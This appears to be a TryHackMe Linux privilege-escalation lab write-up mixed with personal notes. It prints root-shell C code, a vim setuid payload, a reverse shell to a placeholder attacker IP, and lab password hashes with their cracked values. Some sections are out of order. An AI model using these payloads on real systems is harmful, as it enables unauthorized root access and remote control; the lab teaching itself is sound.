
# Introduction 
Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.  
  
This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.

# What is Privilege Escalation
What does "privilege escalation" mean?

At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.  
  

Why is it important?

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

- Resetting passwords  
    
- Bypassing access controls to compromise protected data
- Editing software configurations
- Enabling persistence
- Changing the privilege of existing (or new) users
- Execute any administrative command
# Enumeration
Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.

### hostname

The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

  

### uname -a

Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

  

### /proc/version

The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.

Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

  

### /etc/issue

Systems can also be identified by looking at the `/etc/issue` file. This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

### ps Command

The `ps` command is an effective way to see the running processes on a Linux system. Typing `ps` on your terminal will show processes for the current shell.

The output of the `ps` (Process Status) will show the following;

- PID: The process ID (unique to the process)
- TTY: Terminal type used by the user
- Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
- CMD: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.

- `ps -A`: View all running processes
- `ps axjf`: View process tree (see the tree formation until `ps axjf` is run below)

![](https://i.imgur.com/xsbohSd.png)  

- `ps aux`: The `aux` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.  
    

### env

The `env` command will show environmental variables.

  

![](https://i.imgur.com/LWdJ8Fw.png)

  

The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

  

### sudo -l

The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using `sudo`.

  

ls

One of the common commands used in Linux is probably `ls`.

  

While looking for potential privilege escalation vectors, please remember to always use the `ls` command with the `-la` parameter. The example below shows how the “secret.txt” file can easily be missed using the `ls` or `ls -l` commands.

![](https://i.imgur.com/2jOtOat.png)  

  

  

### Id

The `id` command will provide a general overview of the user’s privilege level and group memberships.

  

It is worth remembering that the `id` command can also be used to obtain the same information for another user as seen below.

  

![](https://i.imgur.com/YzfJliG.png)

  

  

### /etc/passwd

Reading the `/etc/passwd` file can be an easy way to discover users on the system.

  

![](https://i.imgur.com/r6oYOEi.png)

  

While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks.

![](https://i.imgur.com/cpS2U93.png)

  

Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.

  

![](https://i.imgur.com/psxE6V4.png)

  

### history

Looking at earlier commands with the `history` command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

  

### ifconfig

The target system may be a pivoting point to another network. The `ifconfig` command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks.

  

![](https://i.imgur.com/hcdZnwK.png)

  

  

This can be confirmed using the `ip route` command to see which network routes exist.

  

![](https://i.imgur.com/PSrmz5O.png)

  

  

### netstat

Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The `netstat` command can be used with several different options to gather information on existing connections.

  

- `netstat -a`: shows all listening ports and established connections.
- `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
- `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)

  

![](https://i.imgur.com/BbLdyrr.png)

  

- `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.

  

![](https://i.imgur.com/mc8OWP0.png)

  

- `netstat -tp`: list connections with the service name and PID information.

  

![](https://i.imgur.com/fDYQwbW.png)

  

This can also be used with the `-l` option to list listening ports (below)

  

![](https://i.imgur.com/JK7DNv0.png)

  

We can see the “PID/Program name” column is empty as this process is owned by another user.

Below is the same command run with root privileges and reveals this information as 2641/nc (netcat)

![](https://i.imgur.com/FjZHqlY.png)`   `

- `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

![](https://i.imgur.com/r6IjpmZ.png)

  

  

The `netstat` usage you will probably see most often in blog posts, write-ups, and courses is `netstat -ano` which could be broken down as follows;

- `-a`: Display all sockets
- `-n`: Do not resolve names
- `-o`: Display timers

  

![](https://i.imgur.com/UxzLBRw.png)

  

  

### find Command

Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.

Below are some useful examples for the “find” command.

**Find files:**

- `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
- `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
- `find / -type d -name config`: find the directory named config under “/”
- `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x`: find executable files
- `find /home -user frank`: find all files for user “frank” under “/home”
- `find / -mtime 10`: find files that were modified in the last 10 days
- `find / -atime 10`: find files that were accessed in the last 10 day
- `find / -cmin -60`: find files changed within the last hour (60 minutes)
- `find / -amin -60`: find files accesses within the last hour (60 minutes)
- `find / -size 50M`: find files with a 50 MB size

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

![](https://i.imgur.com/pSMfoz4.png)

The example above returns files that are larger than 100 MB. It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output (below).

![](https://i.imgur.com/UKYSdE3.png)

  

Folders and files that can be written to or executed from:

- `find / -writable -type d 2>/dev/null` : Find world-writeable folders
- `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders

The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.

![](https://i.imgur.com/qb0klHH.png)  

- `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders

Find development tools and supported languages:

- `find / -name perl*`
- `find / -name python*`
- `find / -name gcc*`

Find specific file permissions:

Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.

- `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

### General Linux Commands

As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as `find`, `locate`, `grep`, `cut`, `sort`, etc.


# Automated Enumeration Tools
Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

# Privilege Escalation: Sudo
**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the `sudo -l` command.

[https://gtfobins.github.io/](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

**Leverage application functions**  

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).

![](https://i.imgur.com/rNpbbL8.png)  

Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.

**Leverage LD_PRELOAD**

On some systems, you may see the LD_PRELOAD environment option.

![](https://i.imgur.com/gGstS69.png)  

LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.  
![](https://miro.medium.com/v2/resize:fit:1400/1*A5WousU1TdmelgCmqqq9Ow.png)

![](https://miro.medium.com/v2/resize:fit:1400/1*bGqsMsx6m0x1f2YxrFt_SA.png)

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}  

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

![](https://i.imgur.com/HxbszMW.png)  

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

This will result in a shell spawn with root privileges.

# Privilege Escalation: SUID
Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.  
  
You will notice these files have an “s” bit set showing their special permission level.  
  
`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.

**Note**: The attached VM has another binary with SUID other than `nano`.  

The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.  
  
Below are simple steps using both vectors.  
  
reading the `/etc/shadow` file  
  
We see that the nano text editor has the SUID bit set by running the `find / -type f -perm -04000 -ls 2>/dev/null` command.  
  
`nano /etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the `/etc/shadow` and `/etc/passwd` files.

![](https://i.imgur.com/DAWxbJD.png)  

The unshadow tool’s usage can be seen below;  
`unshadow passwd.txt shadow.txt > passwords.txt`  

![](https://i.imgur.com/6cHBAr1.png)  

With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. For a more detailed room on John the Ripper, you can visit [https://tryhackme.com/room/johntheripperbasics](https://tryhackme.com/room/johntheripperbasics).

  

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:

  

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

![](https://i.imgur.com/bkOGaHY.png)  
We will then add this password with a username to the `/etc/passwd` file.


![](https://i.imgur.com/huGoEtj.png)

  

Once our user is added (please note how `root:/bin/bash` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.

  

![](https://i.imgur.com/HZcWGhi.png)  

  Running this command will escalate us to root and read flag4.txt if it was a protected file:  
**_./vim -c ‘:py3 import os; os.setuid(0); os.execl(“/bin/sh”, “sh”, “-c”, “reset; exec sh”)’_**

Now it's your turn to use the skills you were just taught to find a vulnerable binary.

# Privilege Escalation: Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level.

We can use the `getcap` tool to list enabled capabilities.

When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.

Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

**GTFObins** has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.  
  
We notice that vim can be used with the following command and payload:  
  
![](https://i.imgur.com/nlpCMWj.png)  


We can do this by taking a look at the scheduled cron jobs and find one that we can modify the script for. In this case, karen has privileges to read and write to the backup.sh script.

All we have to do now is open it with a text editor like Nano or Vim and write a script that will allow us to open a reverse shell to our attacking machine. The script can look something like:  
**_bash -i >& /dev/tcp/{ATTACKER-IP}/{PORT} 0>&1_**

# Privilege Escalation: PATH
PATH in Linux is an environmental variable that tells the operating system where to search for executables. If a writable folder is listed in the system’s PATH, a user can hijack commands by placing malicious scripts there, since Linux searches those directories to run non-built-in commands.

When you type “something” into the terminal, PATH is the route that Linux will look for the “something” binary or executable. So it will first look in /usr/local/sbin, then it will check in /usr/local/bin, etc.

![](https://miro.medium.com/v2/resize:fit:1240/1*ZSIVfMJzUZ_Ktt5dHTexZQ.png)

example of the $PATH variable

**Q1 — What is the odd folder you have write access for?  
**Running a command such as **`_find / -writable 2>/dev/null | cut -d “/” -f 2,3 | grep -v proc | sort -u`** helps us visualize what we have write permissions to.

Looking through the list the one odd folder that sticks out to me is /home/murdoch, we should be able to write a script in this directory to open a root shell and escalate our privilege to answer the next problem.
![[Pasted image 20250930174329.png]]
We have added “grep -v proc” to get rid of the many results related to running processes

![](https://miro.medium.com/v2/resize:fit:657/1*jrUQH6LnSbtYt6LaiKTNQA.png)

some of the writable folders

**Q2 — What is the content of the flag6.txt file?  
**Before we move further, since we are going to attempt to try and execute a binary in the /home/murdoch folder, we will need to change the current PATH variable to include that directory. To do this, we need to run the command: **`export PATH=/home/murdoch:$PATH`_**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1240/1*AuFxDoWLlbX1Kdw22Oo_XQ.png)

$PATH after appending /home/murdoch

Now let’s examine what’s in the /home/murdoch directory. There are two files present, test and thm.py. As you can see from the permission list, only test has executable rights. When we run test, it returns an error stating that thm is not found, indicating that the script is attempting to execute a file or command named thm.

![](https://miro.medium.com/v2/resize:fit:763/1*tZ_qpG4FGoof-kYoNIclFQ.png)

/home/murdoch contents

We can exploit this by creating our own script named thm that launches a Bash shell. Since the test file is owned by root and attempts to execute thm, running it will spawn a root shell if we control what thm points to.

To perform the exploit, run the following commands. These will: 
1) create a thm script that opens a Bash shell, 
2) grant full permissions to thm for all users, and 
3) execute test to escalate our privileges to a root shell.

![](https://miro.medium.com/v2/resize:fit:900/1*D-R-FLJ0OiruO1kYJ9IXAg.png)

commands for escalation

Now that we have root privileges, we can navigate to flag6.txt and read its contents to get the flag.

![](https://miro.medium.com/v2/resize:fit:896/1*akcbZR3Nye2a8Tc-qFfmYQ.png)

flag6.txt contents

# Privilege Escalation: NFS
NFS (Network File Sharing) configuration is kept in the /etc/exports file. It is a distributed file system protocol that allows a user on a client computer to access files over a network much like local storage is accessed.

Sometimes escalation vectors are not always confined to internal access. Remote management interfaces like SSH and Telnet can also help you gain root access on the target system.

**Q1 — How many mountable shares can you identify on the target system?  
**Mountable shares are located at the bottom of the /etc/exports file.

**Q2 — How many shares have the “no_root_squash” option enabled?  
**We can figure this out by checking the /etc/exports file and looking at the options for each mountable share.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1240/1*nP2RwKmFNbit1zWDlfMM-g.png)

cat /etc/exports

The key to this escalation technique lies in the use of the “no_root_squash” option on a writable NFS share. If this is present, it will allow us to create an executable file and gain a root shell.

By default, the root user is mapped to nfsnobody, a low-privileged user, to prevent remote root access. The **“**no_root_squash” option retains root privileges on the NFS share.

Now with the commands below, we will create a folder on our attacker machine and mount it to the /tmp directory on the target machine. This will act as a backdoor for us to upload a script to open a root shell.

![](https://miro.medium.com/v2/resize:fit:1093/1*5G4M0H62yOSB6OIa4I7JdQ.png)

creating the backdoor

In the nfs.c file, we will use this script which we will run to open a root shell when we switch back to the target machine.

![](https://miro.medium.com/v2/resize:fit:708/1*Q2G4MBgKUFlGZ9-PSesWfQ.png)

nfs.c code

After we compile the code and set the SUID bits, we can switch back to the target machine and run the command to open a root shell.

![](https://miro.medium.com/v2/resize:fit:804/1*1HSnas_j7sWiir-GbqXo0g.png)

compile the code & set the SUID bits

**Q3 — What is the content of the flag7.txt file?  
**Once we have the nfs script on the target machine, run it and you will gain access to the root shell where you can now read the flag7.txt file.

![](https://miro.medium.com/v2/resize:fit:978/1*L6Qgdf1lb_FqVzafJP44yQ.png)

running nfs script and flag7.txt contents

===============================================================

# Conclusion

Hopefully now by the end of this article you feel more confident with privilege escalation in a Linux environment and challenge yourself with the capstone task at the end of this TryHackMe room.

This was my first time doing a technical write-up on something of this magnitude. It was a fun learning experience for me and I hope you learned something useful from this as well.

If you have any questions or feedback please leave a comment. I also have links to my LinkedIn and THM in my About section if you’d like to connect.

//
	Trying:
	
		 - Privilege Escalation: Kernel Exploits
		- Privilege Escalation:SUDO
		- Privilege Escalation PATH
		- 

Linux ip-10-10-151-58 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

Python 2.7.5

missy 
$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/ 
`john --format=crypt --wordlist=path hash.txt`
after using the command above
password = **Password1**

leonard
$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/ = Penny123

root
$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51
`john --format=crypt --wordlist=path hash.txt`
After using the command above

using `sudo -l` for showing what commands the current user is allowed to run via *sudo*, based on the system's sudoers policy

`sudo /usr/bin/find / -type f -name flag2.txt 2>/dev/null`
Full Explanation:

 1. `sudo`

- Runs the following command **with elevated privileges** (as root, unless specified otherwise).
- Needed here because some directories (like `/root`, `/etc`, etc.) are **not readable by regular users**.

 2. `/usr/bin/find`

- The **`find`** command is used to **search for files and directories** in a directory hierarchy.
- Using the full path (`/usr/bin/find`) ensures we’re using the real `find` binary (not an alias or malicious script).

 3. `/`

- This is the **starting point** for the search: the **root directory**.
- So the search will cover the **entire filesystem**.

 4. `-type f`

- Tells `find` to look **only for files** (not directories, symlinks, etc.).
- `f` = regular file.

 5. `-name "flag2.txt"`

- Matches files whose **name is exactly `flag2.txt`**.
- The match is **case-sensitive**.
- You could use `-iname` for case-insensitive search.

 6. `2>/dev/null`

- **Suppresses error messages** (like "Permission denied").
- `2>` redirects **stderr** (file descriptor 2) to `/dev/null` (a black hole).
- Without this, you’d see lots of noise like:
    
    1 find: /root: Permission denied
    
    2 find: /proc/123: No such file or directory

`sudo /usr/bin/find /home/rootflag/flag2.txt -exec cat {} \;`
using it for escalate our priviliges and read the fllag2.txt

